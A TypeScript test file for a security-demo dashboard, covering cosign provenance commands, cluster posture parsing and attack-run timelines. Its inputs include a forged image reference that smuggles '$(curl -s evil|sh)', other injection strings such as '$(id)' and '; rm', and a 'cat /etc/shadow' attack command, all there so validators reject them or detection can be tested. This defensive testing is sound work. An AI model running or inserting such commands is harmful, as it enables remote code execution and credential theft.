import { readFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it, vi } from "vitest";
import { ApiClient, type Result } from "../../src/lib/api";
import { type CatalogueCommand, type CommandOutcome, type Posture, type Provenance, type StreamEvent, parseBuildInfo, parsePosture, parseProvenance, parseRunList, parseStats, parseTick, toStreamEvent } from "../../src/lib/contract";
import { plClock, plTime, when } from "../../src/lib/dom";
import { posture, stats, TERMINAL_OBJECTIVES } from "../../src/lib/fixtures";
import { COSIGN_IDENTITY_REGEXP, COSIGN_ISSUER, ciRunUrl, commitUrl, cosignVerifyCommand, isPinnedImageRef, rekorSearchUrl } from "../../src/lib/provenance";
import { mountConsole } from "../../src/ui/console";
import { buildTimeline, noDetection, publishedPod } from "../../src/lib/timeline";
import { mountEvidence, renderEvidenceCard, renderEvidenceDetail, renderNoAttack, renderTicker, tickerItems } from "../../src/ui/evidence";
import { admissionTone, renderPostureData } from "../../src/ui/posture";
import { renderStats } from "../../src/ui/stats";
import { renderRun } from "../../src/ui/timeline";
import { mountVerify, pollProvenance, renderVerifyPanel } from "../../src/ui/verify";

// ADR 0035: absolute times in Polish time with their CET/CEST label (amendment 2026-10-06), the single
// cosign identity, the parsers of the additions, the posture naming its failures, finished runs saying
// why nothing was detected, and the evidence card.

const T = Date.parse("2026-10-03T18:01:57.123Z");

describe("plTime / when (B2-2)", () => {
  it("writes the date, the time and the zone label, with ms when asked", () => {
    expect(plTime(T)).toBe("2026-10-03 20:01:57 CEST");
    expect(plTime("2026-10-03T18:01:57.123Z", { ms: true })).toBe("2026-10-03 20:01:57.123 CEST");
    // A zone offset is converted, not dropped.
    expect(plTime("2026-10-03T21:01:57+03:00")).toBe("2026-10-03 20:01:57 CEST");
  });

  it("drops the date only on the same Polish day", () => {
    expect(plClock(T, T + 3600_000)).toBe("20:01:57 CEST");
    expect(plClock(T, Date.parse("2026-10-03T22:00:01Z"))).toBe("2026-10-03 20:01:57 CEST");
    expect(plClock(T, T, { ms: true })).toBe("20:01:57.123 CEST");
  });

  it("puts the relative time after the absolute one", () => {
    expect(when("2026-10-03T12:01:57Z", T)).toBe("14:01:57 CEST (6 hours ago)");
    expect(when("2026-10-01T18:01:57Z", T)).toBe("2026-10-01 20:01:57 CEST (2 days ago)");
    expect(when(null, T)).toBe("never");
  });
});

describe("provenance.ts (B3)", () => {
  // Character for character the default of scripts/verify-image.sh (IDENTITY_REGEXP, :40).
  const VERIFY_IMAGE_REGEXP = "^https://github\\.com/HubertMJ/self-defending-portfolio/\\.github/workflows/(build-images|build-web)\\.yml@refs/heads/main$";

  it("uses verify-image.sh's identity and issuer", () => {
    expect(COSIGN_IDENTITY_REGEXP).toBe(VERIFY_IMAGE_REGEXP);
    expect(COSIGN_ISSUER).toBe("https://token.actions.githubusercontent.com");
    const img = `ghcr.io/hubertmj/self-defending-portfolio/api@sha256:${"a".repeat(64)}`;
    expect(cosignVerifyCommand(img)).toBe(`cosign verify ${img} \\\n  --certificate-identity-regexp '${VERIFY_IMAGE_REGEXP}' \\\n  --certificate-oidc-issuer https://token.actions.githubusercontent.com`);
  });

  it("builds exact links and refuses anything else", () => {
    const d = `sha256:${"0123456789abcdef".repeat(4)}`;
    expect(rekorSearchUrl(d)).toBe(`https://search.sigstore.dev/?hash=${d}`);
    expect(rekorSearchUrl("sha256:xyz")).toBeNull();
    expect(commitUrl("0448cff")).toBe("https://github.com/HubertMJ/self-defending-portfolio/commit/0448cff");
    expect(commitUrl("../evil")).toBeNull();
    expect(ciRunUrl("18234567890")).toBe("https://github.com/HubertMJ/self-defending-portfolio/actions/runs/18234567890");
    expect(ciRunUrl("1; rm")).toBeNull();
  });

  it("is the console's only copy of the cosign command", () => {
    const src = readFileSync(join(process.cwd(), "src", "ui", "console.ts"), "utf8");
    expect(src).toContain("cosignVerifyCommand(image)");
    expect(src).not.toMatch(/--certificate-identity\b(?!-regexp)/);
  });

  it("shows what is known when provenance is missing, without throwing", () => {
    const known = renderVerifyPanel({ provenance: null, build: { commit: "a".repeat(40), ci_run_id: "7" } });
    expect(known.querySelector('[data-image="web"]')?.textContent).toContain("aaaaaaa");
    expect(known.querySelector('[data-image="web"] a[href$="/actions/runs/7"]')?.textContent).toMatch(/^CI run 7\b/);
    expect(known.querySelector('[data-image="api"]')?.textContent).toContain("API provenance unavailable");
    const panel = renderVerifyPanel({ provenance: null, build: null });
    expect(panel.textContent).toContain("API provenance unavailable");
    expect(panel.querySelectorAll(".vraw__row").length).toBeGreaterThanOrEqual(9);
  });

  it("panel: short commit linked, the full image, its cosign command and Rekor per image", () => {
    const api = `ghcr.io/hubertmj/self-defending-portfolio/api@sha256:be0895f4${"0".repeat(56)}`;
    const panel = renderVerifyPanel({ provenance: { api: { commit: "0448cff5a1", ci_run_id: "9", images: [api] }, web: { images: [] } }, build: null });
    const card = panel.querySelector('[data-image="api"]') as HTMLElement;
    expect(card.querySelector('a[href$="/commit/0448cff5a1"] code')?.textContent).toBe("0448cff");
    expect(card.querySelector(".vimage__digest .small code")?.textContent).toBe(api);
    expect(card.querySelector(".cmd code")?.textContent).toBe(cosignVerifyCommand(api));
    expect(card.querySelectorAll(".cmd .copy")).toHaveLength(1);
    expect(card.querySelector('a[href="https://search.sigstore.dev/?hash=sha256:be0895f4' + "0".repeat(56) + '"]')).not.toBeNull();
  });
});

describe("parsers of the ADR 0035 additions", () => {
  it("stats: last_run_at and last_24h, all or nothing, absent on an old API", () => {
    const old = parseStats(stats(0));
    expect(old.last_run_at).toBeUndefined();
    expect(old.last_24h).toBeUndefined();
    const w = { since: "2026-10-03T19:05:00Z", runs: 3, detected: 2, responded: 1, falco_alerts: 4, talon_actions: 2 };
    const ok = parseStats({ ...stats(0), last_run_at: "2026-10-03T18:00:00Z", last_24h: w });
    expect(ok.last_run_at).toBe("2026-10-03T18:00:00Z");
    expect(ok.last_24h).toEqual(w);
    const bad = parseStats({ ...stats(0), last_run_at: "yesterday", last_24h: { ...w, runs: -1 } });
    expect(bad.last_run_at).toBeUndefined();
    expect(bad.last_24h).toBeUndefined();
    expect(parseStats({ ...stats(0), last_24h: { ...w, since: 5 } }).last_24h).toBeUndefined();
  });

  it("posture: malformed violations and checks are dropped, caps hold, running is never guessed", () => {
    const p = posture(0);
    const v = { policy: "p", rule: "r", kind: "ReplicaSet", namespace: "falco-response", count: 7, running: false, file: "cluster/x.yaml" };
    const parsed = parsePosture({
      ...p,
      kyverno: { ...p.kyverno, violations: [v, { ...v, count: "7" }, { ...v, running: "no", file: "https://evil" }, ...Array.from({ length: 60 }, () => v)] },
      kube_bench: { ...p.kube_bench, failing: [{ id: "1.1.9", title: "t".repeat(500), remediation: "r" }, { id: "1.1.9; rm", title: "x" }, { id: "1.2.26", title: "y", audit: "secret" }] },
      trivy: { ...p.trivy, last_scan: "not a time" },
      falco: { alerts_24h: 1, counted_since: "2026-10-03T19:05:00Z" },
    });
    expect(parsed.kyverno.violations).toHaveLength(49); // 50 kept, the string count dropped
    expect(parsed.kyverno.violations_truncated).toBe(true);
    expect(parsed.kyverno.violations_incomplete).toBe(true);
    expect(parsed.kyverno.violations?.[1]).toMatchObject({ running: null, file: "" });
    expect(parsed.kube_bench.failing?.map((c) => c.id)).toEqual(["1.1.9", "1.2.26"]);
    expect(parsed.kube_bench.failing?.[0].title.length).toBe(200);
    expect(JSON.stringify(parsed)).not.toContain("secret");
    expect(parsed.trivy.last_scan).toBeUndefined();
    expect(parsed.falco.counted_since).toBe("2026-10-03T19:05:00Z");
  });

  it("posture: not-applicable CIS checks keep their count and reason apart from INFO; older APIs have neither", () => {
    const p = posture(0);
    const na = { id: "1.2.26", title: "Ensure that the --etcd-cafile argument is set", reason: "There is no etcd." };
    const parsed = parsePosture({
      ...p,
      kube_bench: {
        ...p.kube_bench,
        info: 0,
        not_applicable: 3,
        not_applicable_checks: [na, { ...na, id: "1.2.26; rm" }, { id: "1.1.9", title: "t".repeat(500), reason: "r".repeat(500), audit: "secret" }, { id: "1.1.10", title: "no reason" }],
        warning: [{ id: "3.1.1", title: "Client certificate authentication should not be used for users", remediation: "Use OIDC." }, { id: 3, title: "x" }],
      },
    });
    expect(parsed.kube_bench.not_applicable).toBe(3);
    expect(parsed.kube_bench.not_applicable_checks?.map((c) => c.id)).toEqual(["1.2.26", "1.1.9", "1.1.10"]);
    expect(parsed.kube_bench.not_applicable_checks?.[0]).toEqual(na);
    expect(parsed.kube_bench.not_applicable_checks?.[1].reason.length).toBe(300);
    expect(parsed.kube_bench.not_applicable_checks?.[2].reason).toBe("");
    expect(parsed.kube_bench.warning?.map((c) => c.id)).toEqual(["3.1.1"]);
    expect(JSON.stringify(parsed)).not.toContain("secret");
    // A malformed count drops its list with it: the page never names checks it does not count.
    const bad = parsePosture({ ...p, kube_bench: { ...p.kube_bench, not_applicable: "3", not_applicable_checks: [na] } });
    expect(bad.kube_bench.not_applicable).toBeUndefined();
    expect(bad.kube_bench.not_applicable_checks).toBeUndefined();
    const old = parsePosture({ ...p, kube_bench: { last_run: null, pass: 59, fail: 3, warn: 12, info: 14 } });
    expect(old.kube_bench).toEqual({ last_run: null, pass: 59, fail: 3, warn: 12, info: 14 });
  });

  it("provenance: only own api/web images by digest; bad commit and run id become empty", () => {
    const api = `ghcr.io/hubertmj/self-defending-portfolio/api@sha256:${"a".repeat(64)}`;
    const p = parseProvenance({
      api: { commit: "ZZZ", ci_run_id: "12a", images: [api, api, `ghcr.io/hubertmj/self-defending-portfolio/api-x@sha256:${"a".repeat(64)}`, "ghcr.io/evil/api@sha256:00", `ghcr.io/hubertmj/self-defending-portfolio/web@sha256:${"b".repeat(64)}`] },
      web: { images: [`ghcr.io/hubertmj/self-defending-portfolio/web@sha256:${"b".repeat(64)}`, 7] },
    });
    expect(p.api).toEqual({ commit: "", ci_run_id: "", images: [api] });
    expect(p.web.images).toHaveLength(1);
    expect(() => parseProvenance("x")).toThrow();
    expect(parseBuildInfo({ commit: "abc", ci_run_id: "1" })).toEqual({ commit: "", ci_run_id: "1" });
  });

  it("runs list and tick: malformed entries dropped; a __proto__ key is harmless", () => {
    const runs = parseRunList({ runs: [{ run_id: "0123456789abcdef", scenario: "terminal", state: "finished", started_at: "2026-10-03T18:00:00Z", ended_at: null, detected: false, responded: false, events: 9, truncated: false }, { run_id: "../x", scenario: "t", state: "finished", started_at: "2026-10-03T18:00:00Z" }] });
    expect(runs.map((r) => r.run_id)).toEqual(["0123456789abcdef"]);
    expect(parseTick('{"at":"2026-10-03T18:00:00.123456789Z","started_at":"x"}')).toEqual({ at: "2026-10-03T18:00:00.123456789Z" });
    expect(parseTick("{}")).toBeNull();
    const s = parseStats(JSON.parse('{"runs":1,"by_scenario":{"__proto__":{"runs":5,"detected":5,"responded":5}}}'));
    expect(Object.getPrototypeOf(s.by_scenario)).toBe(Object.prototype);
  });
});

const withViolations = (rows: { running: boolean | null; count: number }[], extra: Partial<Posture["kyverno"]> = {}): Posture => {
  const p = posture(0);
  const fail = rows.reduce((a, r) => a + r.count, 0);
  return {
    ...p,
    kyverno: {
      policies: [...p.kyverno.policies.map((x) => ({ ...x, fail: 0 })), { name: "restrict-image-registries", pass: 1, fail, warn: 0 }],
      violations: rows.map((r) => ({ policy: "restrict-image-registries", rule: "autogen-validate-registries", kind: "ReplicaSet", namespace: "falco-response", file: "cluster/infra/kyverno-policies/restrict-image-registries.yaml", ...r })),
      ...extra,
    },
  };
};

describe("posture names its failures (B2-3)", () => {
  it("absent additions render as before: no list, no extra table, the old Runtime label", () => {
    const el = renderPostureData(posture(0), 0);
    expect(el.querySelectorAll(".tile__list")).toHaveLength(0);
    expect(el.querySelectorAll("table")).toHaveLength(2);
    expect(el.textContent).toContain("Runtime, last 24 h");
    expect(el.querySelector(".tile")?.className).toContain("tile--critical");
  });

  it("amber only when every group runs nothing; red with any true or null; the count unchanged", () => {
    const amber = withViolations([{ running: false, count: 4 }, { running: false, count: 3 }]);
    expect(admissionTone(amber)).toBe("warning");
    const el = renderPostureData(amber, 0, "0448cff");
    const tile = el.querySelector(".tile") as HTMLElement;
    expect(tile.className).toContain("tile--warning");
    expect(tile.querySelector(".tile__value")?.textContent).toBe("7 violations");
    expect(tile.textContent).toContain("stale config, nothing running violates");
    expect(tile.textContent).toContain("4 × restrict-image-registries / autogen-validate-registries on ReplicaSet in falco-response - 0 running: old revisions kept at 0 replicas");
    expect(tile.querySelector("a")?.getAttribute("href")).toBe("https://github.com/HubertMJ/self-defending-portfolio/blob/0448cff/cluster/infra/kyverno-policies/restrict-image-registries.yaml");
    expect(admissionTone(withViolations([{ running: false, count: 4 }, { running: true, count: 3 }]))).toBe("critical");
    expect(admissionTone(withViolations([{ running: false, count: 4 }, { running: null, count: 3 }]))).toBe("critical");
    expect(admissionTone(withViolations([{ running: false, count: 4 }], { violations_truncated: true }))).toBe("critical");
    const red = renderPostureData(withViolations([{ running: null, count: 7 }]), 0);
    expect(red.querySelector(".tile")?.className).toContain("tile--critical");
    expect(red.querySelector(".tile__value")?.textContent).toBe("7 violations");
  });

  it("lists failing CIS checks with the remediation open, and dates the scans in Polish time", () => {
    const p = posture(T);
    const el = renderPostureData(
      { ...p, kube_bench: { ...p.kube_bench, failing: [{ id: "1.1.9", title: "CNI file permissions", remediation: "chmod 600" }] }, trivy: { ...p.trivy, last_scan: "2026-10-03T15:10:31Z" }, falco: { ...p.falco, counted_since: "2026-10-03T17:00:00Z" } },
      T,
    );
    const details = el.querySelector(".tile__remedy") as HTMLDetailsElement;
    expect(details.open).toBe(true);
    expect(details.closest("li")?.textContent).toContain("1.1.9 CNI file permissions");
    expect(el.textContent).toContain("last scan 17:10:31 CEST (3 hours ago)");
    expect(el.textContent).toContain("counted since 19:00:00 CEST");
    expect(el.textContent).not.toContain("Runtime, last 24 h");
    expect(el.querySelector(".panel-foot time")?.textContent).toMatch(/CEST \(/);
  });
});

const at = (ms: number) => new Date(T + ms).toISOString();
const ev = (type: string, data: Record<string, unknown>, id?: number): StreamEvent => toStreamEvent(type, data, id) as StreamEvent;
const termRun = (cmds: string[], extra: StreamEvent[] = [], end = true): StreamEvent[] => [
  ev("run", { run_id: "0123456789abcdef", scenario: "terminal", state: "queued", at: at(0) }),
  ev("run", { run_id: "0123456789abcdef", scenario: "terminal", state: "started", at: at(10), pod: "terminal-0123456789" }),
  ...cmds.flatMap((id, i) => [ev("command", { run_id: "0123456789abcdef", seq: i + 1, id, state: "started", at: at(100 + i) }), ev("command", { run_id: "0123456789abcdef", seq: i + 1, id, state: "exited", at: at(200 + i), exit_code: 0 })]),
  ...extra,
  ...(end ? [ev("run", { run_id: "0123456789abcdef", scenario: "terminal", state: "finished", at: at(5000), detail: "left" })] : []),
];
const OUTCOMES = new Map<string, CommandOutcome>([["whoami", "allowed"], ["hostname", "allowed"], ["touch-bin", "prevented"], ["read-shadow", "detected"]]);

describe("why a finished run shows no detection (B2-4)", () => {
  const run = (events: StreamEvent[]) => buildTimeline(events, T + 6000).runs[0];
  const stages = (events: StreamEvent[], outcomes: ReadonlyMap<string, CommandOutcome> | undefined = OUTCOMES) => {
    const el = renderRun(run(events), "Attacker's terminal", new Set(), undefined, undefined, outcomes, T + 6000);
    const s = (k: string) => el.querySelector(`.stage--${k}`) as HTMLElement;
    return { el, detect: s("detect"), respond: s("respond") };
  };

  it("recon only: both stages not applicable, never pending", () => {
    expect(noDetection(run(termRun(["whoami", "hostname"])), OUTCOMES)).toBe("recon");
    const { el, detect, respond } = stages(termRun(["whoami", "hostname"]));
    expect(detect.dataset.reached).toBe("na");
    expect(detect.textContent).toContain("No detection expected");
    expect(detect.textContent).toContain("recon only - no detection expected");
    expect(respond.dataset.reached).toBe("na");
    expect(respond.textContent).toContain("No response needed");
    expect(el.textContent).not.toContain("pending");
    expect(el.querySelector('[data-reached="false"]')).toBeNull();
  });

  it("a preventive layer, no commands, a miss, an unknown catalogue", () => {
    const prevented = stages(termRun(["whoami", "touch-bin"]));
    expect(prevented.detect.dataset.reached).toBe("na");
    expect(prevented.detect.textContent).toContain("recon and commands blocked by a preventive layer");
    const none = stages(termRun([]));
    expect(none.detect.textContent).toContain("No commands run");
    expect(none.respond.dataset.reached).toBe("na");
    const missed = stages(termRun(["whoami", "read-shadow"]));
    expect(missed.detect.dataset.reached).toBe("missed");
    expect(missed.detect.textContent).toContain("Detection expected, none arrived");
    expect(missed.respond.dataset.reached).toBe("false");
    const unknown = stages(termRun(["whoami"]), new Map());
    expect(unknown.detect.dataset.reached).toBe("false");
    expect(unknown.detect.textContent).toContain("(not reached)");
    expect(unknown.detect.textContent).not.toContain("pending");
  });

  it("a scripted run that ended undetected is not reached; an active run is pending", () => {
    const scripted = [ev("run", { run_id: "r1", scenario: "network-tool", state: "started", at: at(0) }), ev("run", { run_id: "r1", scenario: "network-tool", state: "failed", at: at(500), detail: "x" })];
    expect(noDetection(run(scripted), OUTCOMES)).toBe("not-reached");
    const active = stages(termRun(["whoami"], [], false));
    expect(active.detect.dataset.reached).toBe("false");
    expect(active.detect.textContent).toContain("(pending)");
    expect(active.respond.textContent).toContain("(pending)");
  });

  it("history rows carry Polish time with ms and a raw JSON link for a valid run id only", () => {
    const { el } = stages(termRun(["whoami"]));
    expect(el.querySelector(".stage__at")?.textContent).toBe("20:01:57.133 CEST");
    expect(el.querySelector('a[href="/api/runs/0123456789abcdef"]')?.getAttribute("target")).toBe("_blank");
    const bad = renderRun({ ...run(termRun(["whoami"])), runId: "../x" }, "t", new Set(), undefined, undefined, OUTCOMES, T + 6000);
    expect(bad.querySelector('a[href^="/api/runs/"]')).toBeNull();
  });
});

const POD = "scenario-shell-in-container-abc";
const scripted = (n: number): StreamEvent[] => [
  ev("run", { run_id: "0f0e0d0c0b0a0908", scenario: "shell-in-container", state: "queued", at: at(0) }, 1),
  ev("run", { run_id: "0f0e0d0c0b0a0908", scenario: "shell-in-container", state: "started", at: at(50), pod: POD }, 2),
  ...Array.from({ length: n }, (_, i) =>
    ev("falco", { at: at(1000 + i * 10), rule: `Rule ${i}`, priority: "Notice", namespace: "sandbox", pod: POD, output: "o", fields: { "proc.name": "sh", "k8s.ns.name": "sandbox", "secret.field": "nope" }, api_received_at: at(1020 + i * 10) }, 10 + i),
  ),
  ev("talon", { at: at(2000), action: "Terminate Pod", actionner: "kubernetes:terminate", namespace: "sandbox", pod: POD, status: "success", output: "terminated" }, 50),
  ev("run", { run_id: "0f0e0d0c0b0a0908", scenario: "shell-in-container", state: "finished", at: at(3000) }, 51),
];

describe("the evidence card, the ticker and the hero's last run (B4)", () => {
  it("shows at most 3 Falco/Talon events, then 'N more - raw JSON'", () => {
    const run = buildTimeline(scripted(5), T + 4000).runs[0];
    const card = renderEvidenceCard(run, { title: "Shell in a container", now: T + 4000 });
    expect(card.querySelectorAll(".evlist__item")).toHaveLength(3);
    const more = card.querySelector('a[href="/api/runs/0f0e0d0c0b0a0908"]');
    expect(more?.textContent).toContain("3 more - raw JSON");
    expect(card.textContent).toContain(POD);
    expect(card.textContent).toContain("last attack 20:01:57 CEST");
    expect(card.querySelector("details")).toBeNull();
    // An invalid run id never becomes a link.
    expect(renderEvidenceCard({ ...run, runId: "a/b" }, { title: "x", now: T }).querySelector('a[href^="/api/runs/"]')).toBeNull();
  });

  it("the full record shows only allow-listed Falco fields", () => {
    const run = buildTimeline(scripted(1), T + 4000).runs[0];
    // Bypass the parser: the renderer filters again.
    run.falco[0].fields = { ...run.falco[0].fields, "secret.field": "nope" };
    const d = renderEvidenceDetail(run, { title: "x", now: T + 4000 });
    expect(d.textContent).toContain("proc.name");
    expect(d.textContent).not.toContain("secret.field");
  });

  it("the ticker lists only real events, newest first, and says when nothing happened", () => {
    const view = buildTimeline(scripted(2), T + 4000);
    const items = tickerItems(view);
    expect(items.map((i) => i.text)).toEqual(["shell-in-container: Finished", "Talon: Talon deleted the pod", "Falco: Rule 1", "Falco: Rule 0", "shell-in-container: Attack running", "shell-in-container: Queued"]);
    expect(tickerItems(view, 3)).toHaveLength(3);
    const empty = renderTicker([], { now: T, since: T - 60_000, connected: true, tickAt: at(0) });
    expect(empty.textContent).toBe("No events since 2026-10-03 20:00:57 CEST; the stream is connected (server time 2026-10-03 20:01:57 CEST).");
    expect(tickerItems(buildTimeline([], T))).toEqual([]);
  });

  it("no run in memory: when the API started and the last recorded attack, and a way to #attack", () => {
    const el = renderNoAttack({ apiStartedAt: "2026-10-03T17:00:00Z", lastRunAt: "2026-10-03T12:01:57Z", now: T });
    expect(el.textContent).toContain("No attack since the API started at 2026-10-03 19:00:00 CEST - last attack recorded 14:01:57 CEST (6 hours ago).");
    expect(el.querySelector('a[href="#attack"]')).not.toBeNull();
  });

  it("the hero's last-run tile falls back to the API's last_run_at", () => {
    const el = renderStats({ ...stats(T), last_run_at: "2026-10-03T12:01:57Z" }, TERMINAL_OBJECTIVES, undefined, T);
    const tile = el.querySelector(".herostats__tile") as HTMLElement;
    expect(tile.querySelector(".herostats__name")?.textContent).toBe("last run");
    expect(tile.querySelector(".herostats__value")?.textContent).toBe("14:01:57 CEST");
    expect(tile.querySelector(".herostats__foot")?.textContent).toBe("6 hours ago");
    expect(el.textContent).toMatch(/since 2026-08-28 20:01:57 CEST \(\d+ days ago\)/);
  });
});

describe("ApiClient reads the new endpoints, and /build.json outside /api", () => {
  it("asks /build.json at the site root and /api/provenance under the base", async () => {
    const asked: string[] = [];
    const api = new ApiClient({ fetch: async (u) => (asked.push(u), new Response(JSON.stringify({ commit: "", ci_run_id: "" }), { headers: { "Content-Type": "application/json" } })) });
    await api.buildInfo();
    await api.provenance();
    expect(asked).toEqual(["/build.json", "/api/provenance"]);
  });
});

const HEX = "0123456789abcdef".repeat(4);
const EVIL = `$(curl -s evil|sh)x@sha256:${HEX}`;
const GOOD = `ghcr.io/hubertmj/self-defending-portfolio/scenario@sha256:${HEX}`;

describe("a copied cosign command names only a strictly validated pinned image (security review, LOW)", () => {
  it("isPinnedImageRef accepts registry[:port]/path@sha256 and nothing else; the builder throws", () => {
    expect(isPinnedImageRef(GOOD)).toBe(true);
    expect(isPinnedImageRef(`registry.local:5000/a/b-c@sha256:${HEX}`)).toBe(true);
    for (const bad of [EVIL, `$(id) ghcr.io/x/y@sha256:${HEX}`, `ghcr.io/x/y:tag`, `ghcr.io/X/y@sha256:${HEX}`, `ghcr.io/x/y@sha256:${HEX} --insecure`, `ghcr.io/x/y@sha256:${HEX}\n`, `y@sha256:${HEX}`, `${"a/".repeat(150)}b@sha256:${HEX}`]) {
      expect(isPinnedImageRef(bad), bad).toBe(false);
    }
    expect(() => cosignVerifyCommand(EVIL)).toThrow();
  });

  const runWithImage = (image: string) =>
    buildTimeline(
      [
        ev("run", { run_id: "0f0e0d0c0b0a0908", scenario: "shell-in-container", state: "started", at: at(0), pod: POD }, 1),
        ev("pod", { run_id: "0f0e0d0c0b0a0908", pod: POD, uid: "u", phase: "Running", reason: "", container_id: "9b2e7c4d1a0f", image, labels_delta: {}, deleted: false, at: at(10) }, 2),
        ev("run", { run_id: "0f0e0d0c0b0a0908", scenario: "shell-in-container", state: "finished", at: at(3000) }, 3),
      ],
      T + 4000,
    );

  it("the evidence record: no command and no copy button for a forged image", () => {
    const ok = renderEvidenceDetail(runWithImage(GOOD).runs[0], { title: "x", now: T + 4000 });
    expect(ok.querySelectorAll(".cmd .copy")).toHaveLength(1);
    const evil = renderEvidenceDetail(runWithImage(EVIL).runs[0], { title: "x", now: T + 4000 });
    expect(evil.querySelector(".cmd")).toBeNull();
    expect(evil.querySelector(".copy")).toBeNull();
  });

  it("the live run console: no command and no copy button for a forged image", () => {
    const api = new ApiClient({ fetch: async () => new Response("{}", { status: 404, headers: { "Content-Type": "application/json" } }) });
    const cmds = (image: string) => {
      const root = document.createElement("section");
      document.body.append(root);
      mountConsole(root, api).update(runWithImage(image));
      return root.querySelectorAll(".verify .cmd");
    };
    expect(cmds(GOOD)).toHaveLength(1);
    expect(cmds(EVIL)).toHaveLength(0);
  });

  it("the verify panel: no command and no copy button for a forged image", () => {
    const d = { provenance: { api: { commit: "", ci_run_id: "", images: [EVIL] }, web: { images: [] } }, build: null };
    const panel = renderVerifyPanel(d);
    expect(panel.querySelector(".cmd")).toBeNull();
    expect(panel.querySelector('[data-image="api"] .copy')).toBeNull();
    expect(panel.textContent).not.toContain("cosign verify");
  });
});

describe("code review (REQUEST_CHANGES) fixes", () => {
  const OUT = new Map<string, CommandOutcome>([["read-shadow", "detected"], ["whoami", "allowed"]]);
  const cat = new Map([
    ["read-shadow", { id: "read-shadow", input: "cat /etc/shadow", outcome: "detected" }],
    ["whoami", { id: "whoami", input: "id", outcome: "allowed" }],
  ]) as unknown as ReadonlyMap<string, CatalogueCommand>;

  it("the card labels a command's class as expected, and a missed detection in a critical chip", () => {
    const run = buildTimeline(termRun(["read-shadow"]), T + 6000).runs[0];
    expect(noDetection(run, OUT)).toBe("missed");
    const card = renderEvidenceCard(run, { title: "t", now: T + 6000, commands: cat });
    expect(card.querySelector('[data-type="command"]')?.textContent).toContain("expected: detected");
    const chip = card.querySelector(".evcard__head .chip") as HTMLElement;
    expect(chip.className).toContain("chip--critical");
    expect(chip.textContent).toBe("Detection expected, none arrived");
    const recon = renderEvidenceCard(buildTimeline(termRun(["whoami"]), T + 6000).runs[0], { title: "t", now: T + 6000, commands: cat });
    expect(recon.querySelector(".evcard__head .chip")?.textContent).toBe("Finished");
  });

  it("Talon lines carry no raw 'success' token", () => {
    const run = buildTimeline(scripted(1), T + 4000).runs[0];
    const talon = renderEvidenceCard(run, { title: "x", now: T + 4000 }).querySelector('[data-type="talon"]');
    expect(talon?.textContent).not.toContain("success");
  });

  it("runs list: null (or zero) start and end times are absent, never a zero time on the card", () => {
    const row = { run_id: "0123456789abcdef", scenario: "terminal", state: "queued", detected: false, responded: false, events: 1, truncated: false };
    const [a, b] = parseRunList({ runs: [{ ...row, started_at: null, ended_at: null }, { ...row, run_id: "fedcba9876543210", started_at: "0001-01-01T00:00:00Z", ended_at: "2026-10-03T18:00:00Z" }] });
    expect(a).not.toHaveProperty("started_at");
    expect(a).not.toHaveProperty("ended_at");
    expect(b.started_at).toBeUndefined();
    expect(b.ended_at).toBe("2026-10-03T18:00:00Z");
    const card = renderNoAttack({ latest: a, now: T });
    expect(card.textContent).toContain("Latest recorded run 0123456789abcdef (terminal) - raw JSON");
    expect(card.textContent).not.toMatch(/0001|1970|started/);
  });

  it("the empty card names the latest recorded run from its summary, never 'No attack since'", () => {
    const latest = { run_id: "0123456789abcdef", scenario: "terminal", state: "finished" as const, started_at: "2026-10-03T12:01:57Z", detected: false, responded: false, events: 9, truncated: false };
    const el = renderNoAttack({ apiStartedAt: "2026-10-03T17:00:00Z", latest, now: T });
    expect(el.textContent).toContain("Latest recorded run 0123456789abcdef (terminal, started 14:01:57 CEST (6 hours ago)) - raw JSON");
    expect(el.textContent).not.toContain("No attack since");
    expect(renderNoAttack({ now: T }).textContent).toContain("No attack in the stream's replay.");
  });

  it("a pod outside the sandbox is never named, on the card or in the history", () => {
    const evs = scripted(1).map((e) => (e.type === "falco" ? ({ ...e, data: { ...e.data, namespace: "portfolio-api" } } as StreamEvent) : e));
    const run = buildTimeline(evs, T + 4000).runs[0];
    expect(renderEvidenceCard(run, { title: "x", now: T + 4000 }).textContent).not.toContain(POD);
    expect(renderEvidenceDetail(run, { title: "x", now: T + 4000 }).querySelector("dl")?.textContent).not.toContain(POD);
    expect(renderRun(run, "x", new Set(), undefined, undefined, undefined, T + 4000).querySelector(".stage--attack")?.textContent).not.toContain(POD);
    const ok = buildTimeline(scripted(1), T + 4000).runs[0];
    expect(renderRun(ok, "x", new Set(), undefined, undefined, undefined, T + 4000).querySelector(".stage--attack")?.textContent).toContain(POD);
  });

  it("violations that do not add up to the failures stay red", () => {
    const p = withViolations([{ running: false, count: 7 }]);
    expect(admissionTone(p)).toBe("warning");
    expect(admissionTone({ ...p, kyverno: { ...p.kyverno, policies: p.kyverno.policies.map((x) => (x.fail ? { ...x, fail: 9 } : x)) } })).toBe("critical");
  });

  it("names the manual and not-applicable CIS checks, folded, with their remediation and reason; the bar counts them apart", () => {
    const p = posture(T);
    const kube_bench = {
      ...p.kube_bench,
      pass: 69,
      fail: 0,
      warn: 2,
      info: 0,
      failing: [],
      not_applicable: 3,
      not_applicable_checks: [
        { id: "1.1.1", title: "API server pod specification file permissions", reason: "By default, K3s embeds the api server within the k3s process." },
        { id: "1.1.12", title: "etcd data directory ownership", reason: "For K3s, etcd is embedded within the k3s process." },
        { id: "1.2.26", title: "--etcd-cafile", reason: "There is no etcd." },
      ],
      warning: [
        { id: "3.1.1", title: "Client certificate authentication should not be used for users", remediation: "Use OIDC." },
        { id: "3.1.2", title: "Service account token authentication should not be used for users", remediation: "Use OIDC." },
      ],
    };
    const el = renderPostureData({ ...p, kube_bench }, T);
    const cis = [...el.querySelectorAll(".tile")][2];
    expect(cis.querySelector(".tile__value")?.textContent).toBe("97% pass");
    expect(cis.querySelector(".chip")?.textContent).toBe("✓No failures · 2 manual / warn");
    const groups = [...cis.querySelectorAll("details.tile__group")] as HTMLDetailsElement[];
    expect(groups.map((g) => g.querySelector("summary")?.textContent)).toEqual(["Manual / warn (2)", "Not applicable (3)"]);
    expect(groups.every((g) => !g.open)).toBe(true);
    expect(groups[0].querySelectorAll("li")).toHaveLength(2);
    expect(groups[0].querySelector(".tile__remedy p")?.textContent).toBe("Use OIDC.");
    const na = [...groups[1].querySelectorAll("li")];
    expect(na.map((li) => li.querySelector("code")?.textContent)).toEqual(["1.1.1", "1.1.12", "1.2.26"]);
    expect(na[2].querySelector(".tile__reason")?.textContent).toBe("There is no etcd.");
    const legend = [...el.querySelectorAll(".stack-figure")].find((f) => f.textContent?.includes("CIS"));
